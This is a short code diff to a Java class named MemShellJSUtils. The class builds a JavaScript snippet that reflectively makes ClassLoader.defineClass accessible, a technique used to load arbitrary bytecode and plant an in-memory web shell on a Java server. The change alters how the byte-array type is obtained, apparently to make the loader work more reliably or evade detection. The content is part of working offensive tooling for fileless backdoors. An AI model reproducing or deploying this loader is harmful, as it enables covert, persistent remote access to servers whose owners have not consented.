@@ -33,7 +33,7 @@ public class MemShellJSUtils {
                                     "        }" +
                                     "    }" +
                                     "    var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader');" +
-                                    "    var clsByteArray = classLoader.loadClass('[B');" +
+                                    "    var clsByteArray = 'a'.getBytes().getClass();" +
                                     "    var clsInt = java.lang.Integer.TYPE;" +
                                     "    var defineClass = clsClassLoader.getDeclaredMethod('defineClass', clsByteArray, clsInt, clsInt);" +
                                     "    defineClass.setAccessible(true);" +
